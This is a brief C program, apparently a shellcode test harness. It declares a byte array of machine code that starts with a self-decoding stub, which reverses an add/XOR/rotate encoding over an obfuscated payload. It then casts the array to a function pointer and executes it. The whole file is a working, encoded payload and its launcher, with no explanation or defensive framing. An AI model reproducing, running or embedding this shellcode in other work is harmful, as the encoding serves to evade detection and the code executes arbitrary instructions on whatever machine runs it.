#include<stdio.h>
#include<string.h>


unsigned char code[] = \
"\xeb\x18\x5e\x31\xc9\xb1\x19\x31\xdb\x8a\x1e\x80\xc3\x07\x80\xf3\xe0\xd0\xc3\x88\x1e\x46\xe2\xef\xeb\x05\xe8\xe3\xff\xff\xff\x71\x79\xc1\xcd\x70\x70\x52\xcd\xcd\x70\xca\x4d\xd0\x1d\x0a\xc1\x1d\x8a\x42\x1d\x09\xb1\x5e\xff\x99"; // marker3

main()
{
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
	